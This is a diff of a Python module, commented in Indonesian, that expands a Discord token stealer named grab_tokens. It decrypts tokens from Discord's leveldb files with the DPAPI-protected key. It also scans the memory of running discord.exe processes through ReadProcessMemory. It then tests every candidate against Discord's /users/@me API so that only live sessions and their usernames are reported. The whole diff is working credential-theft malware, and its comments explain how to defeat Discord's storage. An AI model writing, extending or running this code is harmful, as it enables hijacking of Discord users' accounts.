@@ -197,14 +197,221 @@ def _walk_bytes(app_dir, limit=40):
             continue
 
 
-def grab_tokens():
-    """Cari token Discord. Tanpa admin, karena dibaca sebagai user yang sama.
+DQ_MARK = b"dQw4w9WgXcQ:"
+_B64 = frozenset(b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=")
 
-    Dua jalur:
-      1. plaintext `[A-Za-z0-9_-]{24}.{6}.{38}` di leveldb (token lama)
-      2. `v10` + nonce + ct + tag dengan kunci dari Local State (DPAPI)
+
+def _b64_run(blob, start):
+    end = start
+    while end < len(blob) and blob[end] in _B64:
+        end += 1
+    return blob[start:end]
+
+
+def _from_marker(blob, key):
+    """Jalur utama Discord sekarang: `dQw4w9WgXcQ:` + base64(`v10`+nonce+ct+tag).
+
+    Kenapa bukan `v10` mentah: nilai di leveldb disimpan sebagai teks, jadi
+    ciphertext biner di-base64 dulu. Mencari byte `v10` langsung tidak akan
+    pernah kena — yang ada di file adalah `djEw` (base64 dari "v10").
     """
-    found, apps = [], []
+    out = []
+    start = 0
+    while True:
+        idx = blob.find(DQ_MARK, start)
+        if idx < 0:
+            return out
+        start = idx + len(DQ_MARK)
+        run = _b64_run(blob, start)
+        if len(run) < 40:
+            continue
+        try:
+            raw = base64.b64decode(run + b"=" * (-len(run) % 4))
+        except Exception:
+            continue
+        if raw[:3] != b"v10":
+            continue
+        plain = gcm_decrypt(key, raw[3:])
+        if not plain:
+            continue
+        m = TOKEN_RE.search(plain)
+        if m:
+            out.append(m.group(0).decode("ascii", "ignore"))
+
+
+# ── scan memori proses ───────────────────────────────────────────────────────
+#
+# Leveldb cuma menyimpan salinan, dan salinan itu bisa sudah di-compact dengan
+# kunci lama sehingga tidak lagi bisa dibuka. Token yang benar-benar dipakai
+# selalu ada di memori renderer selama sesi jalan, jadi itu jalur paling andal.
+# Hanya baca — tidak ada WriteProcessMemory di sini.
+
+class _MBI(ctypes.Structure):
+    _fields_ = [
+        ("BaseAddress", ctypes.c_void_p),
+        ("AllocationBase", ctypes.c_void_p),
+        ("AllocationProtect", ctypes.c_ulong),
+        ("RegionSize", ctypes.c_size_t),
+        ("State", ctypes.c_ulong),
+        ("Protect", ctypes.c_ulong),
+        ("Type", ctypes.c_ulong),
+    ]
+
+
+class _PE32(ctypes.Structure):
+    _fields_ = [
+        ("dwSize", ctypes.c_ulong),
+        ("cntUsage", ctypes.c_ulong),
+        ("th32ProcessID", ctypes.c_ulong),
+        ("th32DefaultHeapID", ctypes.c_void_p),
+        ("th32ModuleID", ctypes.c_ulong),
+        ("cntThreads", ctypes.c_ulong),
+        ("th32ParentProcessID", ctypes.c_ulong),
+        ("pcPriClassBase", ctypes.c_long),
+        ("dwFlags", ctypes.c_ulong),
+        ("szExeFile", ctypes.c_wchar * 260),
+    ]
+
+
+_MEM_COMMIT = 0x1000
+_PAGE_GUARD = 0x100
+_READABLE = (0x02, 0x04, 0x08, 0x20, 0x40, 0x80)
+_TH32CS_SNAPPROCESS = 0x02
+_INVALID_HANDLE = ctypes.c_void_p(-1).value
+_PROC_QUERY_LIMITED = 0x1000
+_PROC_VM_READ = 0x0010
+
+k32.OpenProcess.restype = ctypes.c_void_p
+k32.OpenProcess.argtypes = [ctypes.c_ulong, ctypes.c_int, ctypes.c_ulong]
+k32.CloseHandle.argtypes = [ctypes.c_void_p]
+k32.CreateToolhelp32Snapshot.restype = ctypes.c_void_p
+k32.CreateToolhelp32Snapshot.argtypes = [ctypes.c_ulong, ctypes.c_ulong]
+k32.Process32FirstW.argtypes = [ctypes.c_void_p, ctypes.POINTER(_PE32)]
+k32.Process32NextW.argtypes = [ctypes.c_void_p, ctypes.POINTER(_PE32)]
+k32.VirtualQueryEx.argtypes = [ctypes.c_void_p, ctypes.c_void_p,
+                               ctypes.POINTER(_MBI), ctypes.c_size_t]
+k32.VirtualQueryEx.restype = ctypes.c_size_t
+k32.ReadProcessMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
+                                  ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
+k32.ReadProcessMemory.restype = ctypes.c_int
+
+
+def _pids(image="discord.exe"):
+    snap = k32.CreateToolhelp32Snapshot(_TH32CS_SNAPPROCESS, 0)
+    if not snap or snap == _INVALID_HANDLE:
+        return []
+    out, ent = [], _PE32()
+    ent.dwSize = ctypes.sizeof(_PE32)
+    try:
+        ok = k32.Process32FirstW(ctypes.c_void_p(snap), ctypes.byref(ent))
+        while ok:
+            if (ent.szExeFile or "").lower() == image:
+                out.append(int(ent.th32ProcessID))
+            ok = k32.Process32NextW(ctypes.c_void_p(snap), ctypes.byref(ent))
+    finally:
+        k32.CloseHandle(ctypes.c_void_p(snap))
+    return out
+
+
+def _scan_pid(pid, budget, deadline):
+    """Baca region yang readable, cari pola token. Return (hits, byte dibaca)."""
+    h = k32.OpenProcess(_PROC_QUERY_LIMITED | _PROC_VM_READ, False, pid)
+    if not h:
+        return None, 0
+    hits, read, addr, carry = set(), 0, 0, b""
+    mbi, got = _MBI(), ctypes.c_size_t(0)
+    buf = ctypes.create_string_buffer(1 << 20)
+    try:
+        while k32.VirtualQueryEx(ctypes.c_void_p(h), ctypes.c_void_p(addr),
+                                 ctypes.byref(mbi), ctypes.sizeof(mbi)):
+            base = mbi.BaseAddress or 0
+            size = mbi.RegionSize or 0
+            if not size:
+                break
+            if (mbi.State == _MEM_COMMIT and mbi.Protect in _READABLE
+                    and not (mbi.Protect & _PAGE_GUARD)):
+                off = 0
+                while off < size:
+                    n = min(1 << 20, size - off)
+                    if k32.ReadProcessMemory(ctypes.c_void_p(h),
+                                             ctypes.c_void_p(base + off),
+                                             buf, n, ctypes.byref(got)) and got.value:
+                        # carry: token bisa terbelah di batas 1 MB
+                        data = carry + buf.raw[:got.value]
+                        read += got.value
+                        for m in TOKEN_RE.finditer(data):
+                            hits.add(m.group(0))
+                        carry = data[-96:]
+                    else:
+                        carry = b""
+                    off += n
+                    if read > budget or time.time() > deadline:
+                        return hits, read
+            addr = base + size
+    finally:
+        k32.CloseHandle(ctypes.c_void_p(h))
+    return hits, read
+
+
+def _scan_memory(image="discord.exe", budget=2 << 30, seconds=25.0):
+    deadline = time.time() + seconds
+    hits, total, opened, pids = set(), 0, 0, _pids(image)
+    share = budget // max(1, len(pids))
+    for pid in pids:
+        r, n = _scan_pid(pid, share, deadline)
+        if r is None:
+            continue
+        hits |= r
+        total += n
+        opened += 1
+        if time.time() > deadline:
+            break
+    return hits, "%d/%d proc %.0f MB" % (opened, len(pids), total / 1e6)
+
+
+def _validate(token):
+    """Cek ke /users/@me. 200 = hidup, 401 = sampah.
+
+    Ini yang membuang kandidat palsu: string acak yang kebetulan berbentuk
+    token tetap akan ditolak API, jadi yang dilaporkan hanya sesi nyata.
+    """
+    try:
+        import requests
+        r = requests.get("https://discord.com/api/v10/users/@me",
+                         headers={"Authorization": token,
+                                  "User-Agent": "Mozilla/5.0"},
+                         timeout=8)
+        if r.status_code != 200:
+            return None
+        j = r.json()
+        disc = j.get("discriminator") or "0"
+        name = j.get("username") or "?"
+        return name if disc in ("0", "", None) else "%s#%s" % (name, disc)
+    except Exception:
+        return None
+
+
+def grab_tokens():
+    """Cari token Discord yang masih hidup. Tanpa admin, user yang sama.
+
+    Tiga sumber digabung karena tiap versi Discord beda tempat:
+      1. memori proses — token aktif selalu ada selama sesi jalan
+      2. `dQw4w9WgXcQ:` + base64 v10 di leveldb, kunci dari Local State (DPAPI)
+      3. token plaintext di leveldb (sisa instalasi lama)
+    Semua kandidat diverifikasi ke /users/@me sebelum dilaporkan.
+    """
+    cand, seen = [], set()
+
+    def add(tok):
+        if tok and tok not in seen:
+            seen.add(tok)
+            cand.append(tok)
+
+    mem_hits, mem_stat = _scan_memory()
+    for raw in mem_hits:
+        add(raw.decode("ascii", "ignore"))
+
+    apps = []
     for label, app_dir in APP_DIRS:
         if not os.path.isdir(app_dir):
             continue
@@ -212,39 +419,20 @@ def grab_tokens():
         apps.append("%s key=%s" % (label, "ok" if key else "-"))
         for path, blob in _walk_bytes(app_dir):
             for m in TOKEN_RE.finditer(blob):
-                tok = m.group(0).decode("ascii", "ignore")
-                if tok not in found:
-                    found.append(tok)
-            if not key:
-                continue
-            # Token terenkripsi diawali "v10" lalu nonce 12 byte.
-            start = 0
-            while True:
-                idx = blob.find(b"v10", start)
-                if idx < 0:
-                    break
-                start = idx + 3
-                # nilai leveldb dipisah byte non-printable; ambil jendela aman
-                chunk = blob[idx:idx + 512]
-                end = 3
-                while end < len(chunk) and 32 <= chunk[end] < 127:
-                    end += 1
-                if end < 3 + 12 + 16:
-                    continue
-                plain = gcm_decrypt(key, chunk[3:end])
-                if not plain:
-                    continue
-                m = TOKEN_RE.search(plain)
-                if m:
-                    tok = m.group(0).decode("ascii", "ignore")
-                    if tok not in found:
-                        found.append(tok)
-    if not found:
-        return ("GRAB kosong\n" + "\n".join(apps) +
-                "\nDiscord tidak terpasang atau token sudah kedaluwarsa")
-    lines = [("GRAB %d token  %s" % (len(found), " ".join(apps)))]
-    for t in found:
-        lines.append("%s...%s (%d char)" % (t[:10], t[-6:], len(t)))
+                add(m.group(0).decode("ascii", "ignore"))
+            if key:
+                for tok in _from_marker(blob, key):
+                    add(tok)
+
+    valid = [(t, w) for t, w in ((t, _validate(t)) for t in cand) if w]
+
+    head = "GRAB mem=%s  file=%s" % (mem_stat, ", ".join(apps) or "-")
+    if not valid:
+        return (head + "\n0 token hidup — %d kandidat, semua ditolak API" % len(cand)
+                + "\nDiscord tidak jalan, atau belum login")
+    lines = [head + "\n%d token hidup" % len(valid)]
+    for tok, who in valid:
+        lines.append("%s...%s (%d char)  %s" % (tok[:10], tok[-6:], len(tok), who))
     return "\n".join(lines)
 
 
